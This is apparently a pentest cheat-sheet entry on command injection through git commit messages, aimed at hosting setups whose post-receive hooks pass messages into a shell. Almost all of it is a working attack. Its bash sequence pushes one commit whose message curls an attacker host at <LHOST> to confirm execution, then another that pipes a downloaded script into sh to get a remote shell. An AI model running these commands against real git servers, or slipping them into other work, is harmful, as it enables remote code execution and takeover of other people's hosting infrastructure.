# Git post-receive Hook Command Injection

If a git-hosting setup (gitolite, a custom hook) logs the commit message by interpolating it into a shell command, a crafted commit message is command injection.

```bash
echo a > file
git add .
git commit -m '$(curl http://<LHOST>/callback)'   # confirm execution first
git push

echo b > file
git add .
git commit -m '$(curl http://<LHOST>/shell|sh)'   # then escalate to a shell
git push
```
